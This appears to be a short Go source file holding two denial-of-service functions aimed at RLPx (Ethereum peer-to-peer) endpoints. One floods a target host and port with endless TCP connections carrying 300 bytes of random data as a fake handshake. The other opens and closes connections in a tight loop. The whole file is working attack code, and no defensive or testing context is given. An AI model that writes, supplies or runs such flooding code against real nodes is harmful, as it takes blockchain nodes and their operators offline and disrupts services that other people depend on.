package main

import (
	"crypto/rand"
	"fmt"
	"net"
	"time"
)

// HandshakeFloodDOS floods the target with random handshake initiations (random bytes)
func HandshakeFloodDOS(target string, port int) error {
	addr := fmt.Sprintf("%s:%d", target, port)
	fmt.Printf("Starting RLPx Handshake Flood DoS on %s\n", addr)
	for {
		conn, err := net.DialTimeout("tcp", addr, 2*time.Second)
		if err != nil {
			fmt.Printf("[!] Failed to connect: %v\n", err)
			continue
		}
		// Send random bytes as handshake (not a valid handshake, but stresses the parser)
		handshake := make([]byte, 300) // EIP-8 handshake is up to 300 bytes
		rand.Read(handshake)
		conn.Write(handshake)
		conn.Close()
	}
	return nil
}

// ConnectionChurnDOS rapidly opens and closes TCP connections to the target
func ConnectionChurnDOS(target string, port int) error {
	addr := fmt.Sprintf("%s:%d", target, port)
	fmt.Printf("Starting RLPx Connection Churn DoS on %s\n", addr)
	for {
		conn, err := net.DialTimeout("tcp", addr, 2*time.Second)
		if err != nil {
			fmt.Printf("[!] Failed to connect: %v\n", err)
			continue
		}
		conn.Close()
	}
	return nil
}
